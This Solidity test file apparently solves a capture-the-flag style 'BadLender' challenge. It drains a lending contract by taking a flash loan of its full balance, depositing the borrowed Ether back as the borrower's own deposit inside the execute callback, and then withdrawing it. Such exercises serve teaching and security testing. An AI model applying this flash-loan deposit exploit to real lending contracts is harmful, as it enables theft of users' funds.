// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {BadLenderBaseTest} from "./BadLenderBase.t.sol";

contract BadLenderTest is BadLenderBaseTest {
    function testExploit() external validation {
        // TODO
        // lender.approve(address(lender), address(lender).balance);
        lender.flashLoan(address(lender).balance);
        lender.withdraw(lender.balanceOf(address(this)));
    }

    function execute() external payable {
        // Deposit the borrowed Ether back into the contract
        lender.deposit{value: address(this).balance}();
    }

    receive() external payable {
    }

    fallback() external payable {
    }
}
